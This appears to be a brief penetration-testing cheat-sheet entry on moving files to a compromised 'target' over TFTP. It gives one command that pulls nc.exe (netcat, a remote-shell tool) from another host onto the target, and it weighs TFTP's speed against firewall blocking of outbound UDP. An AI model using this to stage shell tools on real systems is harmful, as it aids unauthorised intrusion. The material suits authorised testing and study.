On target we have tftp running. We want to transfer a file to target:
Target> tftp -i 192.168.9.10  GET nc.exe

By default the file is transfered to /srv/tftp/

TFTP Pros 
- TFTP is based on UDP and is therefore fast. TFTP is a good option to choose for small files.

TFTP Cons 
- TFTP is based on UDP and therefore unreliable. 
- Organizations rarely allow outbound UDP traffic, so such a file transfer attempt will usually be blocked at the corporate firewall.
